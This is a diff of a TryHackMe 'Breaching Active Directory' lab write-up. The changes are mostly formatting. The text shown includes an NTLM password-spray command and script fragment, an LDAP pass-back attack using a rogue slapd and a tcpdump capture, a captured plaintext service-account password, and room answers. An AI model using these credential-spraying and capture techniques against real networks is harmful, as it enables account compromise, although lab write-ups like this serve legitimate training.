@@ -246,7 +246,7 @@ def password_spray(self, password, url):
     print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
 ```
 
-🔧 Running the Script
+### Running the Script
 Command:
 ```
 python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a
@@ -320,10 +320,9 @@ if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
 ```    
 Add: (all with spaces no tabs, even if aligns causes issues with python)
 
+# print(response.text)
+# Final Modified Code Block (only the changed part)
 ```
-print(response.text)
-✅ Final Modified Code Block (only the changed part)
-python
 if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
     print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
     print (response.text)   # <-- This prints the message shown by the web app
@@ -345,7 +344,12 @@ Hello World
 [-] Failed login with Username: louise.talbot
 ...
 ```
-## Task 3 LDAP Bind Credentials
+
+
+
+
+
+## Task 4 LDAP Bind Credentials
 
 LDAP Authentication & LDAP Pass‑Back Attacks
 
@@ -479,7 +483,7 @@ SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
 SASL SSF: 0
 modifying entry "cn=config"
 
-                                                                                              
+# restart slapd                                                                                             
 $ sudo service slapd restart 
                                                                                               
 $ ldapsearch -H ldap:// -x LLL -s base -b "" supportedSASLMechanisms
@@ -502,17 +506,16 @@ result: 0 Success
 
 # numResponses: 2
 # numEntries: 1
-                                                                                              
-$ 
 ```
+
 The run the following line as is and retry the url http://printer.za.tryhackme.com/settings.aspx:
 ```
 sudo tcpdump -SX -i breachad tcp port 389
 ```
+
 The password is obtained for svcLDAP account (may have to send twice from the URL for it to be captured):
 ```
-┌──(hacktopuser㉿hacktop)-[/mnt/VBoxShare/CTF/Learning_modules/Breaching_Active_Directory]
-└─$ sudo tcpdump -SX -i breachad tcp port 389
+$ sudo tcpdump -SX -i breachad tcp port 389
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
 05:15:29.576114 IP 10.200.70.201.53173 > 10.150.70.22.ldap: Flags [SEW], seq 43895292, win 64240, options [mss 1287,nop,wscale 8,nop,nop,sackOK], length 0
@@ -548,7 +551,7 @@ password11
 
 tryhackmeldappass1@
 
-### Q1 What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems? 
+### Q1 TasWhat type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems? 
 
 Answer: Pass‑back Attack
 
@@ -751,7 +754,6 @@ Requirements:
 - This gives you an active authenticated session without knowing the password.
 - This is the basis of SMB relay attacks.
 
-✔ THM Questions (Answers)
 Question	Answer
 ### Q1 Task 5: What is the name of the tool we can use to poison and capture authentication requests on the network?
 
